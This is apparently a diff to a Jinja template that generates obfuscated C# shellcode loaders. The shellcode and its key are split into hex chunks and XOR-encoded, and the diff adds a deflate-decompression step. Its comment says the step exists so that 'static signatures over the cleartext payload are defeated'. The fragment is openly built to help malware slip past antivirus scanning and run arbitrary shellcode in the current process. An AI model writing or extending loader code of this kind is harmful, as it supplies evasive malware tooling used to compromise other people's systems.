@@ -158,6 +158,17 @@ namespace {{ v.namespace }} {
             byte[] _k = {{ v.fn_hex }}({% for chunk in key_chunks %}"{{ chunk }}"{% if not loop.last %}+{% endif %}{% endfor %});
             for (int _ki = 0; _ki < _k.Length; _ki++) _k[_ki] ^= (byte){{ key_tweak }};
             byte[] sc = {{ v.fn_xor }}({{ v.fn_hex }}({% for chunk in shellcode_chunks %}"{{ chunk }}"{% if not loop.last %}+{% endif %}{% endfor %}), _k);
+            {%- if is_compressed %}
+            // Decompress: server pre-deflated the raw shellcode before XOR
+            // so static signatures over the cleartext payload are defeated.
+            using (var _csm = new System.IO.MemoryStream(sc))
+            using (var _ds  = new System.IO.Compression.DeflateStream(_csm,
+                                  System.IO.Compression.CompressionMode.Decompress))
+            using (var _dsm = new System.IO.MemoryStream()) {
+                _ds.CopyTo(_dsm);
+                sc = _dsm.ToArray();
+            }
+            {%- endif %}
             {%- endif %}
 
             IntPtr ph  = (IntPtr)(-1);
